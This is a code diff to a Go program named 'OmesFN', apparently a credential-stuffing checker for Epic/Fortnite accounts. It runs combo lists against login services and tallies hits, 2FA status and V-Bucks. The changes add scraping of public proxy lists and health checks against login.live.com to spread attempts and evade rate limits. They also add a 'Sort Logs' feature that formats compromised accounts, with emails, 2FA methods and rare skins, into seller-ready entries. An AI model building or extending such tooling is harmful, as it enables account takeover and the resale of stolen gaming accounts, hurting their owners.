@@ -19,14 +19,18 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
-
+"net/http" 
+	"net/url"  
 	"github.com/go-ini/ini"
 )
 
 var (
 	dashboardEnabled bool = false
 	dashboardMutex   sync.Mutex
-	dashboardData    map[string]interface{}
+	dashboardData    = map[string]interface{}{}
+	UseScrapedProxies bool
+	ScrapedProxies    []string
+	
 )
 
 func LoadConfig() bool {
@@ -43,6 +47,11 @@ func LoadConfig() bool {
 		if key, err := generalSection.GetKey("threads"); err == nil {
 			if threads, err := key.Int(); err == nil {
 				ThreadCount = threads
+			}
+		}
+		if key, err := generalSection.GetKey("proxyless_max_threads"); err == nil {
+			if maxThreads, err := key.Int(); err == nil && maxThreads > 0 {
+				ProxylessMaxThreads = maxThreads
 			}
 		}
 	}
@@ -137,6 +146,169 @@ func PrintLogo() {
 	fmt.Println()
 	LogInfo(fmt.Sprintf("License Status: [%s]", LeftDays))
 	fmt.Println()
+}
+
+func ScrapeProxies() []string {
+	LogInfo("Scraping proxies from multiple sites...")
+
+	apiURLs := []string{
+		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite",
+		"https://raw.githubusercontent.com/mmpx12/proxy-list/refs/heads/master/https.txt",
+		"https://www.proxy-list.download/api/v1/get?type=http",  
+		"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt",
+	}
+
+	client := &http.Client{Timeout: 15 * time.Second}
+
+	rawChan := make(chan []string, len(apiURLs))
+	errChan := make(chan string, len(apiURLs))
+	var wg sync.WaitGroup
+
+	for _, url := range apiURLs {
+		wg.Add(1)
+		go func(u string) {
+			defer wg.Done()
+			start := time.Now()
+			resp, err := client.Get(u)
+			if err != nil {
+				errChan <- fmt.Sprintf("Site %s failed after %v: %v", u, time.Since(start), err)
+				return
+			}
+			defer resp.Body.Close()
+
+			if resp.StatusCode != 200 {
+				errChan <- fmt.Sprintf("Site %s returned %s (took %v)", u, resp.Status, time.Since(start))
+				return
+			}
+
+			body, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				errChan <- fmt.Sprintf("Site %s read failed: %v", u, err)
+				return
+			}
+
+			proxies := strings.Split(string(body), "\n")
+			var clean []string
+			for _, p := range proxies {
+				p = strings.TrimSpace(p)
+				if p != "" && strings.Contains(p, ":") {
+					parts := strings.Split(p, ":")
+					if len(parts) == 2 {
+						clean = append(clean, p)
+					}
+				}
+			}
+			LogInfo(fmt.Sprintf("Site %s: %d raw proxies (took %v)", u, len(clean), time.Since(start)))
+			rawChan <- clean
+		}(url)
+	}
+
+	wg.Wait()
+	close(rawChan)
+	close(errChan)
+
+	proxySet := make(map[string]bool)
+	for rawList := range rawChan {
+		for _, p := range rawList {
+			proxySet[p] = true
+		}
+	}
+
+	for errMsg := range errChan {
+		LogError(errMsg)
+	}
+
+	var allProxies []string
+	for p := range proxySet {
+		allProxies = append(allProxies, p)
+	}
+
+	LogInfo(fmt.Sprintf("Combined %d unique raw proxies from %d sites.", len(allProxies), len(apiURLs)))
+	return allProxies
+}
+
+func CheckProxyHealth(proxy string) bool {
+	transport := &http.Transport{
+		Proxy: http.ProxyURL(&url.URL{Scheme: "http", Host: proxy}),
+	}
+	client := &http.Client{Transport: transport, Timeout: 15 * time.Second}
+
+	resp, err := client.Get("https://login.live.com")
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+
+	return resp.StatusCode == 200
+}
+
+func FilterHealthyProxies(rawProxies []string) []string {
+	var healthy []string
+	var wg sync.WaitGroup
+	healthChan := make(chan string, len(rawProxies))
+	errChan := make(chan error, len(rawProxies))
+
+	for _, proxy := range rawProxies {
+		wg.Add(1)
+		go func(p string) {
+			defer wg.Done()
+			if CheckProxyHealth(p) {
+				healthChan <- p
+			} else {
+				errChan <- fmt.Errorf("unhealthy: %s", p)
+			}
+		}(proxy)
+	}
+
+	wg.Wait()
+	close(healthChan)
+	close(errChan)
+
+	for p := range healthChan {
+		healthy = append(healthy, p)
+	}
+
+	LogInfo(fmt.Sprintf("Filtered to %d healthy proxies (90%% uptime).", len(healthy)))
+	return healthy
+}
+
+func AskForProxyScraping() {
+	reader := bufio.NewReader(os.Stdin)
+	ClearConsole()
+	PrintLogo()
+	LogInfo("Would you like to scrape proxies from sites and use them? [y/n] (or 'p' for manual proxies/proxyless)")
+	fmt.Print("[>] ")
+	input, _ := reader.ReadString('\n')
+	input = strings.TrimSpace(input)
+	switch strings.ToLower(input) {
+	case "y":
+		UseScrapedProxies = true
+		rawProxies := ScrapeProxies()
+		if len(rawProxies) > 0 {
+			Proxies = FilterHealthyProxies(rawProxies)
+			UseProxies = true
+			ProxyType = "http"
+			LogSuccess(fmt.Sprintf("Loaded %d healthy scraped proxies.", len(Proxies)))
+			if len(Proxies) > 0 {
+    proxyFile, _ := os.Create("scraped_proxies.txt")
+    for _, p := range Proxies {
+        fmt.Fprintln(proxyFile, p)
+    }
+    proxyFile.Close()
+    LogInfo("Saved healthy proxies to scraped_proxies.txt")
+}
+		} else {
+			UseProxies = false
+			LogWarning("Scraping failed, falling back to proxyless.")
+		}
+	case "p":
+		UseScrapedProxies = false
+		AskForProxies()
+	default:
+		UseScrapedProxies = false
+		UseProxies = false // Proxyless
+		LogInfo("Going proxyless.")
+	}
 }
 
 func LoadFiles() {
@@ -331,6 +503,224 @@ func saveVbucksHit(entry string, vbucks int) {
 	}
 }
 
+func contains(slice []string, item string) bool {
+	for _, s := range slice {
+		if s == item {
+			return true
+		}
+	}
+	return false
+}
+
+func checkRareSkinsAdapted(skinsList string) (bool, []string, []string) {
+	hasOgRare := false
+	ogSkinsFound := []string{}
+	rareSkinsFound := []string{}
+	skins := strings.Split(skinsList, ", ")
+	for _, skin := range skins {
+		trimmedSkin := strings.TrimSpace(skin)
+		if trimmedSkin == "" {
+			continue
+		}
+		// Check OGs
+		for _, ogSkinStr := range strings.Split(OGRaresList, ",") {
+			og := strings.TrimSpace(ogSkinStr)
+			if og != "" && (strings.Contains(strings.ToLower(trimmedSkin), strings.ToLower(og)) || strings.Contains(strings.ToLower(og), strings.ToLower(trimmedSkin))) {
+				if !contains(ogSkinsFound, og) {
+					ogSkinsFound = append(ogSkinsFound, og)
+				}
+				hasOgRare = true
+			}
+		}
+		// Check Rares
+		for _, rareSkinStr := range strings.Split(RaresList, ",") {
+			rare := strings.TrimSpace(rareSkinStr)
+			if rare != "" && (strings.Contains(strings.ToLower(trimmedSkin), strings.ToLower(rare)) || strings.Contains(strings.ToLower(rare), strings.ToLower(trimmedSkin))) {
+				if !contains(rareSkinsFound, rare) {
+					rareSkinsFound = append(rareSkinsFound, rare)
+				}
+			}
+		}
+	}
+	return hasOgRare, ogSkinsFound, rareSkinsFound
+}
+
+func SortLogs(reader *bufio.Reader) {
+	ClearConsole()
+	PrintLogo()
+	LogInfo("Select folder to sort logs:")
+
+	dirs, err := ioutil.ReadDir("Results")
+	if err != nil {
+		LogError("No Results folder found or error reading it.")
+		time.Sleep(2 * time.Second)
+		return
+	}
+
+	folderList := []string{}
+	for _, f := range dirs {
+		if f.IsDir() {
+			folderList = append(folderList, f.Name())
+		}
+	}
+
+	if len(folderList) == 0 {
+		LogError("No folders found in Results.")
+		time.Sleep(2 * time.Second)
+		return
+	}
+
+	for i, f := range folderList {
+		LogInfo(fmt.Sprintf("[%d] %s", i+1, f))
+	}
+
+	fmt.Print("[>] ")
+	input, _ := reader.ReadString('\n')
+	input = strings.TrimSpace(input)
+	idx, err := strconv.Atoi(input)
+	if err != nil || idx < 1 || idx > len(folderList) {
+		LogWarning("Invalid selection.")
+		time.Sleep(1 * time.Second)
+		return
+	}
+
+	selected := folderList[idx-1]
+	basePath := filepath.Join("Results", selected)
+
+	catMap := map[string]string{
+		"0_skins.txt":      "0 Skins",
+		"1-9_skins.txt":    "1+ Skins",
+		"10+_skins.txt":    "10+ Skins",
+		"50+_skins.txt":    "50+ Skins",
+		"100+_skins.txt":   "100+ Skins",
+		"200+_skins.txt":   "200+ Skins",
+		"300+_skins.txt":   "300+ Skins",
+	}
+
+	// Collect exclusives by scanning all files
+	var exclusives []string
+	for fileName := range catMap {
+		filePath := filepath.Join(basePath, fileName)
+		content, err := ioutil.ReadFile(filePath)
+		if err != nil {
+			continue
+		}
+		lines := strings.Split(string(content), "\n")
+		for _, line := range lines {
+			line = strings.TrimSpace(line)
+			if !strings.HasPrefix(line, "Account:") {
+				continue
+			}
+			parts := strings.Split(line, " | ")
+			fields := make(map[string]string)
+			for _, p := range parts {
+				kv := strings.SplitN(p, ": ", 2)
+				if len(kv) == 2 {
+					fields[kv[0]] = kv[1]
+				}
+			}
+			if _, ok := fields["Account"]; !ok {
+				continue
+			}
+			acc := fields["Account"]
+			epicEmail := fields["Epic Email"]
+			skinCountStr := fields["Skin Count"]
+			vbucks := fields["V-Bucks"]
+			methods := fields["2FA Methods"]
+			stw := fields["Has STW"]
+			lastPlayed := fields["Last Played"]
+			skins := fields["Skins"]
+
+			hasOg, ogFound, rareFound := checkRareSkinsAdapted(skins)
+			if hasOg || len(rareFound) > 0 {
+				var trigger string
+				var foundList []string
+				if hasOg {
+					trigger = "OG skins"
+					foundList = ogFound
+				} else {
+					trigger = "Exclusive Skins"
+					foundList = rareFound
+				}
+				exclEntry := fmt.Sprintf("%s | Epic Email: %s | %s: %s | Skin Count: %s | V-Bucks: %s | 2FA Methods: %s | STW: %s | Last Played: %s",
+					acc, epicEmail, trigger, strings.Join(foundList, ", "), skinCountStr, vbucks, methods, stw, lastPlayed)
+				exclusives = append(exclusives, exclEntry)
+			}
+		}
+	}
+
+	outPath := filepath.Join(basePath, "sorted_log.txt")
+	f, err := os.Create(outPath)
+	if err != nil {
+		LogError(fmt.Sprintf("Failed to create %s", outPath))
+		time.Sleep(2 * time.Second)
+		return
+	}
+	defer f.Close()
+
+	if len(exclusives) > 0 {
+		fmt.Fprintf(f, "==================== Exclusives & Ogs ====================\n")
+		for _, e := range exclusives {
+			fmt.Fprintf(f, "%s\n", e)
+		}
+		fmt.Fprintln(f)
+	}
+
+	for fileName, section := range catMap {
+		filePath := filepath.Join(basePath, fileName)
+		content, err := ioutil.ReadFile(filePath)
+		if err != nil {
+			continue
+		}
+		lines := strings.Split(string(content), "\n")
+		var entries []string
+		for _, line := range lines {
+			line = strings.TrimSpace(line)
+			if !strings.HasPrefix(line, "Account:") {
+				continue
+			}
+			parts := strings.Split(line, " | ")
+			fields := make(map[string]string)
+			for _, p := range parts {
+				kv := strings.SplitN(p, ": ", 2)
+				if len(kv) == 2 {
+					fields[kv[0]] = kv[1]
+				}
+			}
+			if _, ok := fields["Account"]; !ok {
+				continue
+			}
+			acc := fields["Account"]
+			epicEmail := fields["Epic Email"]
+			fa := fields["FA"]
+			verified := fields["Email Verified"]
+			methods := fields["2FA Methods"]
+			vbucks := fields["V-Bucks"]
+			skinCountStr := fields["Skin Count"]
+			lastPlayed := fields["Last Played"]
+			psn := fields["PSN"]
+			nintendo := fields["Nintendo"]
+			skins := fields["Skins"]
+
+			sellerEntry := fmt.Sprintf("Epic Email: %s | FA: %s | Email Verified: %s | 2FA Methods: %s | V-Bucks: %s | Skin Count: %s | Last Played: %s | PSN Connectable: %s | Nintendo Connectable: %s | Skins: %s",
+				epicEmail, fa, verified, methods, vbucks, skinCountStr, lastPlayed, psn, nintendo, skins)
+			fullEntry := fmt.Sprintf("%s | %s", acc, sellerEntry)
+			entries = append(entries, fullEntry)
+		}
+		if len(entries) > 0 {
+			fmt.Fprintf(f, "==================== %s ====================\n", section)
+			for _, e := range entries {
+				fmt.Fprintf(f, "%s\n", e)
+			}
+			fmt.Fprintln(f)
+		}
+	}
+
+	LogSuccess(fmt.Sprintf("Sorted log created: %s/sorted_log.txt", selected))
+	fmt.Println("\nPress Enter to continue...")
+	reader.ReadString('\n')
+}
+
 func main() {
 	debugFlag := flag.Bool("debug", false, "Enable debug mode to display response data")
 	flag.Parse()
@@ -361,6 +751,7 @@ func main() {
 		LogInfo("║              Main Menu                ║")
 		LogInfo("╠════════════════════════════════════════╣")
 		LogInfo("║ [1] Run FN Checker                    ║")
+		LogInfo("║ [2] Sort Logs                         ║")
 		LogInfo("║ [0] Exit                              ║")
 		LogInfo("╚════════════════════════════════════════╝")
 		fmt.Print("\n [>] ")
@@ -371,10 +762,11 @@ func main() {
 			if ThreadCount <= 0 {
 				AskForThreads()
 			}
-			if ProxyType == "" { 
+			if ProxyType == "" {
 				AskForProxies()
 			}
 			LoadFiles()
+			AskForProxyScraping()
 			if UseProxies {
 				Proxies, err := LoadProxies("proxies.txt")
 				if err != nil {
@@ -383,6 +775,10 @@ func main() {
 				} else {
 					LogInfo(fmt.Sprintf("Loaded [%d] proxies from proxies.txt!", len(Proxies)))
 				}
+			}
+			if !UseProxies && ProxylessMaxThreads > 0 && ThreadCount > ProxylessMaxThreads {
+				LogInfo(fmt.Sprintf("Proxyless mode detected - capping threads to %d to reduce rate-limit skips.", ProxylessMaxThreads))
+				ThreadCount = ProxylessMaxThreads
 			}
 			if len(Ccombos) == 0 {
 				LogError("No valid combos loaded. Please check combo.txt. Exiting.")
@@ -394,7 +790,7 @@ func main() {
 			LogInfo("Press any key to start checking!")
 			var modules []func(string) bool
 			modules = append(modules, CheckAccount)
-			reader.ReadString('\n') 
+			reader.ReadString('\n')
 			CheckerRunning = true
 			Sw = time.Now()
 			var titleWg sync.WaitGroup
@@ -445,8 +841,8 @@ func main() {
 			WorkWg.Wait()
 			close(Combos)
 			wg.Wait()
-			CheckerRunning = false 
-			titleWg.Wait()   
+			CheckerRunning = false
+			titleWg.Wait()
 			LogSuccess("\nAll checking completed! Hit counts:")
 			stats := fmt.Sprintf("MS: %d | Hits: %d | Epic 2FA: %d", MsHits, Hits, EpicTwofa)
 			fmt.Printf("%s[SUCCESS] %s%s\n", ColorGreen, centerText(stats, 80), ColorReset)
@@ -459,6 +855,8 @@ func main() {
 			LogError("\nPress Enter to exit...")
 			reader.ReadString('\n')
 			return
+		case "2":
+			SortLogs(reader)
 		case "0":
 			LogInfo("Exiting...")
 			return
@@ -595,7 +993,7 @@ func calculateAverageQuality() int {
 	}
 	avgVbucks := 0
 	if int(Hits) > 0 && len(Ccombos) > 0 {
-		avgVbucks = 25000 + (int(Hits) * 500) 
+		avgVbucks = 25000 + (int(Hits) * 500)
 	}
 	return avgVbucks / int(Hits)
 }
@@ -614,11 +1012,11 @@ func calculateQualityScore() float64 {
 		return 0.0
 	}
 	totalScore := 0.0
-	score := float64(Hits) / float64(Check) * 40.0 
+	score := float64(Hits) / float64(Check) * 40.0
 	totalScore += score
-	score = float64(EpicTwofa) / float64(Hits) * 30.0 
+	score = float64(EpicTwofa) / float64(Hits) * 30.0
 	totalScore += score
-	score = float64(Rares) / float64(Hits) * 30.0 
+	score = float64(Rares) / float64(Hits) * 30.0
 	totalScore += score
 	return totalScore
 }
@@ -678,7 +1076,7 @@ func displayHitDistribution() {
 	skinCount50plus := 0
 	skinCount100plus := 0
 	faCount := 0
-	nfaCount := int(Hits) 
+	nfaCount := int(Hits)
 	files, err := ioutil.ReadDir("Results")
 	if err == nil && len(files) > 0 {
 		latestFolder := files[len(files)-1].Name()
@@ -765,8 +1163,9 @@ func UpdateTitle(wg *sync.WaitGroup) {
 		seconds := int(elapsed.Seconds()) % 60
 		cpm := atomic.LoadInt64(&Cpm)
 		atomic.StoreInt64(&Cpm, 0)
-		title := fmt.Sprintf("OmesFN | Checked: %d/%d | Hits: %d | 2fa: %d | Epic 2fa: %d | CPM: %d | Time: %dm %ds",
-			Check, len(Ccombos), Hits, Twofa, EpicTwofa, cpm*60, minutes, seconds)
+		threadInfo := ""
+		title := fmt.Sprintf("OmesFN%s | Checked: %d/%d | Hits: %d | 2fa: %d | Epic 2fa: %d | CPM: %d | Time: %dm %ds",
+			threadInfo, Check, len(Ccombos), Hits, Twofa, EpicTwofa, cpm*60, minutes, seconds)
 		setConsoleTitle(title)
 		if dashboardEnabled {
 			displayDashboard()
@@ -819,10 +1218,10 @@ func initDiscordRPC() {
 		return
 	}
 	LogInfo("Initializing Discord RPC...")
-	
+
 	for i := 0; i < 10; i++ {
 		pipeName := fmt.Sprintf(`\\.\pipe\discord-ipc-%d`, i)
-		
+
 		pipeHandle, err := syscall.CreateFile(
 			syscall.StringToUTF16Ptr(pipeName),
 			syscall.GENERIC_READ|syscall.GENERIC_WRITE,
@@ -853,9 +1252,9 @@ func initDiscordRPC() {
 	}
 	sendRPCCommand(handshake)
 	LogSuccess("Discord RPC handshake sent!")
-	
+
 	time.Sleep(1 * time.Second)
-	
+
 	testPresence := map[string]interface{}{
 		"cmd": "SET_ACTIVITY",
 		"args": map[string]interface{}{
